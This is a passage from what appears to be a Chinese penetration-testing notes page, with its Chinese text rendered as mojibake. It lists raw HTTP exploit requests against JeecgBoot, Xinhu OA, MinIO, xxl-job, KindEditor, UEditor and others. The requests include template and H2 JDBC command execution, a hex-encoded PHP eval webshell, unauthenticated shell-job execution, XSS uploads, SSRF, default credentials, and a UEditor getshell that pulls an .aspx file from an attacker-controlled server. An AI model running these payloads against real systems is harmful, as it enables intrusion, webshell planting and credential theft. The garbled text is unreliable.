(KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>123</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">&#123;&quot;sql&quot;:&quot;select &#x27;result:&lt;#assign ex=\&quot;freemarker.<span class="keyword">template</span>.utility.<span class="keyword">Execute</span>\&quot;?new()&gt; $&#123; ex(\&quot;<span class="keyword">open</span> -a calculator.app  \&quot;) &#125;&#x27; &quot;&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>JDBC</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecgboot/jmreport/testConnection</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.90.1:3100</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>383</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json;charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.90.1:3100</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.90.1:3100/login?redirect=/dashboard/analysis</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-powershell">&#123;</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;1&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;code&quot;</span>: <span class="string">&quot;dataSource1&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbType&quot;</span>: <span class="string">&quot;H2&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbDriver&quot;</span>: <span class="string">&quot;org.h2.Driver&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbUrl&quot;</span>: <span class="string">&quot;jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS <span class="variable">$</span><span class="variable">$</span>//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec(&#x27;open -a calculator.app&#x27;)\u000A<span class="variable">$</span><span class="variable">$</span>&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbName&quot;</span>: <span class="string">&quot;test&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbUsername&quot;</span>: <span class="string">&quot;sa&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbPassword&quot;</span>: <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;connectTimes&quot;</span>: <span class="number">5</span></span></span><br><span class="line"><span class="language-powershell">&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="ä¿¡å‘¼OA"><a href="#ä¿¡å‘¼OA" class="headerlink" title="ä¿¡å‘¼OA"></a>ä¿¡å‘¼OA</h3><ul><li><p>åå°æ–‡ä»¶ä¸Šä¼ </p><p><img src="/../images/image-20230901104539733.png" alt="image-20230901104539733"></p><p><img src="/../images/image-20230901104908007.png" alt="image-20230901104908007"></p><p>è¿˜åŸæ–‡ä»¶</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=19</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230901104840680.png" alt="image-20230901104840680"></p></li><li><p>åå°é…ç½®æ–‡ä»¶getshell</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?a=changestyle&amp;m=geren&amp;d=system&amp;ajaxbool=<span class="literal">true</span>&amp;style=<span class="number">21</span>,id=<span class="number">1</span>,name=<span class="number">0x610A6576616C28245F504F53545B315D293B2F2F</span></span><br></pre></td></tr></table></figure><p>é‡æ–°ç™»é™†</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=<span class="literal">true</span>&amp;rnd=<span class="number">705961</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230901110753588.png" alt="image-20230901110753588"></p><p>ä»£ç æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /index.php</span><br><span class="line">    </span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230901104430670.png" alt="image-20230901104430670"></p><p>æ³¨æ„ï¼šç”¨äº†è¿™ä¸ªåå°ä¸»é¡µä¼šå‡ºç°é—®é¢˜</p></li><li><p>åå°SSRF</p><p>ä¿å­˜è¯·æ±‚</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?a=setsave&amp;m=xinhu&amp;d=main&amp;ajaxbool=true</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">host</span>=http://<span class="literal">on</span>j888.dnslog.cn</span></span><br></pre></td></tr></table></figure><p>å‘é€è¯·æ±‚</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?a=testsends&amp;m=xinhu&amp;d=main&amp;ajaxbool=true</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure></li><li><p>å‰å°å­˜å‚¨å‹XSSæ¼æ´</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?m=login&amp;a=getoption&amp;ajaxbool=true&amp;num=aaaa\</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">Client-ip:111&#x27;,web=0x3C7363726970743E616C65727428787373293C2F7363726970743E--</span><br></pre></td></tr></table></figure><blockquote><p>web&#x3D; [XSSä»£ç çš„hexç¼–ç ]+[(tabé”®)â€“(tabé”®)]</p></blockquote><p>æŸ¥çœ‹æ—¥å¿—å¤„è§¦å‘xssä»£ç </p></li></ul><h3 id="Wordpress"><a href="#Wordpress" class="headerlink" title="Wordpress"></a>Wordpress</h3><ul><li>è¿›åå°</li><li>å‰å°æ‰¾æ’ä»¶ï¼Œæ‰«å¤‡ä»½æ–‡ä»¶</li></ul><p><a href="https://mp.weixin.qq.com/s/kJDo2725ztlAO2HCnANOlg">å¹²è´§ | Wordpressç½‘ç«™æ¸—é€æ–¹æ³•æŒ‡å— (qq.com)</a></p><p><a href="https://wpscan.com/">WPScan: WordPress Security Scanner</a></p><p><a href="https://www.jianshu.com/p/42e3b065ad76">WordPress xmlrpc.php æ¼æ´åˆ©ç”¨ - ç®€ä¹¦ (jianshu.com)</a></p><blockquote><p>æˆ‘åªèƒ½æ”¶åˆ°dnslog</p></blockquote><p>å¯†ç é‡ç½®</p><blockquote><p>å“¥æ–¯æ‹‰çš„æ•°æ®åº“åªèƒ½æ‰§è¡ŒæŸ¥è¯¢æ“ä½œ</p><p>å†°èçš„æ•°æ®åº“è¦è‡ªå·±è¿›è¡Œsqlæ“ä½œ</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> wp_users limit <span class="number">0</span>,<span class="number">20</span></span><br><span class="line"><span class="keyword">update</span> wp_users <span class="keyword">set</span> user_pass<span class="operator">=</span>md5(&quot;test&quot;)  <span class="keyword">where</span> user_login<span class="operator">=</span>&quot;oY_Zb5ADu0lV2QM0KarP6y6MrLus&quot;</span><br></pre></td></tr></table></figure><h3 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h3><ul><li>actuatorç«¯ç‚¹</li><li>swaggeræ¥å£</li><li>rce</li><li>æƒé™ç»•è¿‡</li></ul><h3 id="Apache-Druid"><a href="#Apache-Druid" class="headerlink" title="Apache Druid"></a>Apache Druid</h3><p>kafaraååºåˆ—åŒ–</p><p><img src="/../images/image-20230624162154282.png" alt="image-20230624162154282"></p><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p><a href="https://fgtbnc.github.io/2023/05/01/Redis%E6%BC%8F%E6%B4%9E/">Redisæ¼æ´ | Khazâ€™s Blog (fgtbnc.github.io)</a></p><h3 id="VUE"><a href="#VUE" class="headerlink" title="VUE"></a>VUE</h3><p>ä¸»è¦æ˜¯æ¥å£æµ‹è¯•</p><ul><li><p>go-vue-admin</p><p><a href="https://www.freebuf.com/articles/network/319175.html">Gin-Vue-adminå‚ç›´è¶Šæƒæ¼æ´ä¸ä»£ç åˆ†æ-CVE-2022-21660 - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><img src="/../images/image-20230828171702219.png" alt="image-20230828171702219"></p><p><img src="/../images/image-20230828171740088.png" alt="image-20230828171740088"></p></li><li><p>vue-typescript-admin</p><p><img src="/../images/image-20230828171358217.png" alt="image-20230828171358217"></p></li></ul><h3 id="FastAdmins"><a href="#FastAdmins" class="headerlink" title="FastAdmins"></a>FastAdmins</h3><p><a href="https://www.loadcaps.com/posts/2bcc03cb.html">Fastadmin æ¼æ´åˆé›† | Caps</a></p><p><img src="/../images/image-20230913172616785.png" alt="image-20230913172616785"></p><p><img src="/../images/image-20230724153102913.png" alt="image-20230724153102913"></p><p><img src="/../images/image-20230805193921798.png" alt="image-20230805193921798"></p><h3 id="jeeplus"><a href="#jeeplus" class="headerlink" title="jeeplus"></a>jeeplus</h3><p><a href="https://www.freebuf.com/articles/web/220066.html">ä»£ç å®¡è®¡å…¥é—¨ä¹‹Jeeplusä»£ç å®¡è®¡ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jeeplusåå°æœ‰druidï¼Œå¯ä»¥å°è¯•æœªæˆæƒè®¿é—®</span><br><span class="line">https://xxx/api/jeeplus/druid/index.html</span><br><span class="line">https://xxx/api/jeeplus/swagger-ui.html</span><br></pre></td></tr></table></figure><h3 id="Minio"><a href="#Minio" class="headerlink" title="Minio"></a>Minio</h3><p><strong>é»˜è®¤å£ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">minioadmin/minioadmin</span><br></pre></td></tr></table></figure><p><strong>CVE-2023-28432 MinIOä¿¡æ¯æ³„éœ²æ¼æ´</strong> </p><p>æœªç»èº«ä»½è®¤è¯çš„è¿œç¨‹æ”»å‡»è€…é€šè¿‡å‘é€ç‰¹æ®ŠHTTPè¯·æ±‚å³å¯è·å–æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­åŒ…æ‹¬MINIO_SECRET_KEYå’ŒMINIO_ROOT_PASSWORDï¼Œé€ æˆæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´æ”»å‡»è€…ä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•MinIOã€‚</p><p>æ³¨æ„ç‚¹ï¼š</p><blockquote><p>åœ¨MinIOåœ¨å¯åŠ¨æ—¶ä¼šä»ç¯å¢ƒå˜é‡ä¸­è¯»å–ç”¨æˆ·é¢„è®¾çš„ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ï¼Œå¦‚æœçœç•¥åˆ™é»˜è®¤è´¦å·å¯†ç ä¸ºminioadmin&#x2F;minioadminã€‚</p><p>å¦å¤–ï¼Œå¦‚æœå¼€å¯åŠ¨Minioæ—¶æ²¡æœ‰è®¾ç½®MINIO_ROOT_USERå’ŒMINIO_ROOT_PASSWORDï¼Œé‚£ä¹ˆMinioä½¿ç”¨é»˜è®¤è´¦å·å¯†ç minioadminï¼Œè¿™æ—¶å€™å†åšä¿¡æ¯æ³„éœ²éªŒè¯ä¼šå‘ç°è¯»å–ä¸åˆ°ç®¡ç†å‘˜çš„è´¦å·å¯†ç ï¼Œåˆ™æ¨æ–­å­˜åœ¨é»˜è®¤å£ä»¤ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/v1/check-version å¯ä»¥æŸ¥çœ‹MinIOç‰ˆæœ¬</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/minio/bootstrap/v1/verify</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure><p>æ ¹æ®POCæ”¹åŒ…ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨ä¿¡æ¯æ³„éœ²ï¼ŒåŒ…å«å†…ç½‘IPæ³„éœ²ç­‰ã€‚</p><p><img src="/../images/640" alt="å›¾ç‰‡"></p><p>æ‹¿åˆ°è´¦å¯†è¿›å…¥åå°ä¹‹åï¼Œå¯ä»¥åˆ©ç”¨MinIOçš„è‡ªæ›´æ–°è¾¾åˆ°RCE  <a href="https://mp.weixin.qq.com/s/7-nWwsOLUNs7S83CiH2xMQ">MinIOè‡ªæ›´æ–°RCE</a></p><p><a href="https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html">CVE-2021-21287: å®¹å™¨ä¸äº‘çš„ç¢°æ’â€”â€”ä¸€æ¬¡å¯¹MinIOçš„æµ‹è¯• | ç¦»åˆ«æ­Œ</a></p><h3 id="xxl-job"><a href="#xxl-job" class="headerlink" title="xxl-job"></a>xxl-job</h3><ul><li><p>å¼±å£ä»¤+åå°å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin/123456</span><br></pre></td></tr></table></figure><p>ä»»åŠ¡ç®¡ç† - æ–°å¢ è¿è¡Œæ¨¡å¼ä½¿ç”¨ GLUE(Shell) </p><p>æ“ä½œå¤„é€‰æ‹©Glue IDEå†™å…¥å‘½ä»¤æ‰§è¡Œè„šæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/bin/bash</span></span><br><span class="line">cmd</span><br></pre></td></tr></table></figure><p>æ“ä½œå¤„ç‚¹å‡»æ‰§è¡Œå³å¯</p></li><li><p>æœªæˆæƒRCE</p><ul><li><p>XxlJob&lt;&#x3D;2.1.2</p><p><a href="https://xz.aliyun.com/t/11091#toc-3">è€æ›²æ–°å”±ä¹‹XXL-JOBæœªæˆæƒHessian2ååºåˆ—åŒ–è°ƒè¯•åˆ†æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p></li><li><p>XxlJob &gt;&#x3D; 2.2.0 </p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /run</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;jobId&quot;: 1,</span><br><span class="line">  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,</span><br><span class="line">  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,</span><br><span class="line">  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,</span><br><span class="line">  &quot;executorTimeout&quot;: 0,</span><br><span class="line">  &quot;logId&quot;: 1,</span><br><span class="line">  &quot;logDateTime&quot;: 1586629003729,</span><br><span class="line">  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,</span><br><span class="line">  &quot;glueSource&quot;: &quot;å‘½ä»¤&quot;,</span><br><span class="line">  &quot;glueUpdatetime&quot;: 1586699003758,</span><br><span class="line">  &quot;broadcastIndex&quot;: 0,</span><br><span class="line">  &quot;broadcastTotal&quot;: 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="adminer"><a href="#adminer" class="headerlink" title="adminer"></a>adminer</h3><p><img src="/../images/20220415164052-c209290a-bc97-1.png" alt="20220415164052-c209290a-bc97-1"></p><p><a href="https://xz.aliyun.com/t/11225#toc-6">ä¸€æ¬¡adminerä¹‹æ—… - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://www.yuque.com/challenger-sfhjb/blog/xv4gts">Adminer(&lt;4.7.9)-SSRF-ä¼—æµ‹æ—¶å¤ç°+Ffufæ‰¹é‡è„šæœ¬ Â· è¯­é›€ (yuque.com)</a></p><h3 id="ç¼–è¾‘å™¨"><a href="#ç¼–è¾‘å™¨" class="headerlink" title="ç¼–è¾‘å™¨"></a>ç¼–è¾‘å™¨</h3><h4 id="kindeditor-lt-x3D-4-1-11â€“XSS"><a href="#kindeditor-lt-x3D-4-1-11â€“XSS" class="headerlink" title="kindeditor&lt;&#x3D;4.1.11â€“XSS"></a>kindeditor&lt;&#x3D;4.1.11â€“XSS</h4><p>ä¸Šä¼ è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/kindeditor/asp/upload_json.asp?dir=file</span><br><span class="line">/kindeditor/asp.net/upload_json.ashx?dir=file</span><br><span class="line">/kindeditor/jsp/upload_json.jsp?dir=file</span><br><span class="line">/kindeditor/php/upload_json.php?dir=file</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/kindeditor/asp/upload_json.asp?dir=file</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>210</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryZ4ILit8qr5XXhdT5</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">------WebKitFormBoundaryZ4ILit8qr5XXhdT5</span></span><br><span class="line"><span class="language-routeros">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">&quot;imgFile&quot;</span>; <span class="attribute">filename</span>=<span class="string">&quot;1.html&quot;</span></span></span><br><span class="line"><span class="language-routeros">Content-Type: text/html</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros">&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert(1)&gt;</span></span><br><span class="line"><span class="language-routeros">------WebKitFormBoundaryZ4ILit8qr5XXhdT5--</span></span><br></pre></td></tr></table></figure><h4 id="Ueditor"><a href="#Ueditor" class="headerlink" title="Ueditor"></a>Ueditor</h4><ul><li><p>SSRF</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/ueditor/jsp/getRemoteImage.jsp?upfile=url</span><br><span class="line">/ueditor/jsp/controller.jsp?action=catchimage&amp;source[]=url</span><br><span class="line">/ueditor/php/controller.php?action=catchimage&amp;source[]=url</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶ä¸Šä¼ </p><ul><li><p>XSS</p><blockquote><p>Ueditor é»˜è®¤æ”¯æŒä¸Šä¼  xml ï¼šconfig.jsonå¯ä»¥æŸ¥çœ‹æ”¯æŒä¸Šä¼ çš„åç¼€</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ueditor/asp/config.json</span><br><span class="line">/ueditor/net/config.json</span><br><span class="line">/ueditor/php/config.json</span><br><span class="line">/ueditor/jsp/config.json</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ PATH</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ueditor/xxx/controller.php?action=uploadfile</span><br><span class="line">/ueditor/xxx/controller.php?action=uploadimage</span><br></pre></td></tr></table></figure><p>æ•°æ®åŒ…</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">  Content-Length: 325</span><br><span class="line">  </span><br><span class="line">  ------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">  Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;1.xml&quot;</span><br><span class="line">  Content-Type: image/png</span><br><span class="line">  </span><br><span class="line">  &lt;html&gt;</span><br><span class="line">  &lt;head&gt;&lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;something:script xmlns:something=&quot;http://www.w3.org/1999/xhtml&quot;&gt; alert(1);</span><br><span class="line">  &lt;/something:script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">  &lt;/html&gt;</span><br><span class="line">  ------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br></pre></td></tr></table></figure><p>é—®é¢˜</p><p><img src="/../images/image-20230928150035548.png" alt="image-20230928150035548"></p></li><li><p>.netä¸‹GetShell</p><blockquote><p>æœåŠ¡å™¨ä¸Šå­˜æ”¾åä¸º666.jpgçš„å›¾ç‰‡é©¬</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/æ›¿æ¢æ¼æ´URLåœ°å€æ‹¼æ¥/UEditor/net/controller.ashx?action=catchimage</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>x.x.x.x</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;100&quot;, &quot;Chromium&quot;;v=&quot;100&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>49</span><br><span class="line"></span><br><span class="line"><span class="language-jboss-cli">source[]=http:<span class="string">//</span>æ›¿æ¢ä¸ºè‡ªå·±æœåŠ¡å™¨å¼€å¯httpæœåŠ¡çš„URLåœ°å€<span class="string">/666.jpg</span>?<span class="string">.aspx</span></span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="å¸†è½¯"><a href="#å¸†è½¯" class="headerlink" title="å¸†è½¯"></a>å¸†è½¯</h3><p><a href="https://help.fanruan.com/finereport/doc-view-4833.html">å®‰å…¨æ¼æ´å£°æ˜- FineReportå¸®åŠ©æ–‡æ¡£ - å…¨é¢çš„æŠ¥è¡¨ä½¿ç”¨æ•™ç¨‹å’Œå­¦ä¹ èµ„æ–™</a></p><p>èƒ½å¤Ÿä½œä¸ºè‡´è¿œOAçš„ç»„ä»¶</p><ul><li><p>å¸†è½¯V8</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjY1MDEwNA==&mid=2247483675&idx=1&sn=3a6d8544cf5d4396b21d49ab91bd59bf&chksm=cf2e4a0cf859c31ab0703576966a1c46dd565e29cacd3fba3116ba3684923b80286ea1041e31&scene=126&sessionid=1647656066&subscene=207&key=b58103fa9e1debe406843de4e261019a638ff6adb409cef53de99d6db836986a2d16232425a37f1e3d56c18d1c08821da5713530b2aa9646cfd37bece4f874cf51cf11dcb88ca80a05286826a662b7f6515c8ad6fc7c01517ac5ab3996de95d328bd72fda95f86dbbdbb37765685dc68733dca335ff43cb90e04a003d38c1869&ascene=0&uin=MTM1NzU2MDQ1OQ==&devicetype=Windows+Server+2016+x64&version=6305002e&lang=zh_CN&exportke">å¸†è½¯æŠ¥è¡¨ç»„åˆæ‹³æ¼æ´åˆ†æ</a></p><p>[å¸†è½¯æŠ¥è¡¨ V8 get_geo_json ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2018-04757 - Vuls Wiki](<a href="https://vuls.info/PeiQi/wiki/oa/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8">https://vuls.info/PeiQi/wiki/oa/å¸†è½¯OA/å¸†è½¯æŠ¥è¡¨</a> V8 get_geo_json ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2018-04757&#x2F;#_4)</p><p><a href="https://www.freesion.com/article/1056237571/">FineReportï¼ˆå¸†è½¯ï¼‰æŠ¥è¡¨ç³»ç»Ÿç›®å½•éå†æ¼æ´å¤ç°å’Œç”¨ç®€æ˜“è¿‡æ»¤å™¨å¤„ç† - ç°ä¿¡ç½‘ï¼ˆè½¯ä»¶å¼€å‘åšå®¢èšåˆï¼‰</a></p></li><li><p>å¸†è½¯V9</p><p><a href="https://xz.aliyun.com/t/9578">å¸†è½¯ï¼ˆFineReport) V9ä»»æ„æ–‡ä»¶è¦†ç›–æ¼æ´ - å…ˆçŸ¥ç¤¾åŒº</a></p></li><li><p>å¸†è½¯V10</p><p>ååºåˆ—åŒ–</p></li></ul><p><img src="/../images/image" alt="img"></p><p><img src="/../images/image-20230731170236076.png" alt="image-20230731170236076"></p><h3 id="Blade-X"><a href="#Blade-X" class="headerlink" title="Blade-X"></a>Blade-X</h3><p>å›¾æ ‡</p><p><img src="/../images/favicon.png" alt="favicon"></p><p><a href="https://forum.butian.net/share/1089">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-spring-blade SQLæ³¨å…¥æ¼æ´ (butian.net)</a></p><p><a href="https://juejin.cn/post/7194311491175055418">è½¬è½½ï¼šSpringBladeæ¡†æ¶JWTè®¤è¯ç¼ºé™·æ¼æ´CVE-2021-44910 - æ˜é‡‘ (juejin.cn)</a></p><h3 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h3><ul><li><p>debugæ¨¡å¼ä¸‹</p><ul><li><p>æ•æ„Ÿå˜é‡æ³„æ¼ï¼šæ¯”å¦‚æ•°æ®åº“çš„è´¦å¯†</p></li><li><p>æ—¥å¿—æ³„æ¼ï¼ˆè¿™ä¸ªæ„Ÿè§‰æ¯”è¾ƒå¤šï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é»˜è®¤æ—¥å¿—åä¸ºyear_month_day.log</span></span><br><span class="line">/Application/Runtime/Logs/app_name/æ—¥å¿—å</span><br><span class="line">/Runtime/Logs/app_name/æ—¥å¿—å</span><br></pre></td></tr></table></figure></li><li><p>æ‰¾ç™»å½•æ—¥å¿—è¿›åå°</p></li><li><p>è§‚å¯Ÿsqlè¯­å¥è¿›è¡ŒSQLæ³¨å…¥</p></li><li><p>cacheæ–‡ä»¶getshell &lt;&#x3D; 5.10</p><blockquote><p>ç¼“å­˜æ–‡ä»¶ï¼šç½‘ç«™ä¸ºäº†å®ç°åŠ é€Ÿè®¿é—®ï¼Œä¼šå°†ç”¨æˆ·è®¿é—®è¿‡çš„é¡µé¢å­˜å…¥ç¼“å­˜æ¥å‡å°æ•°æ®åº“æŸ¥è¯¢çš„å¼€é”€</p><p>å¯èƒ½éœ€è¦é€šè¿‡æ—¥å¿—æ‰¾åˆ°cacheæ–‡ä»¶çš„å‘½åæ–¹å¼</p></blockquote><p>é»˜è®¤æƒ…å†µä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 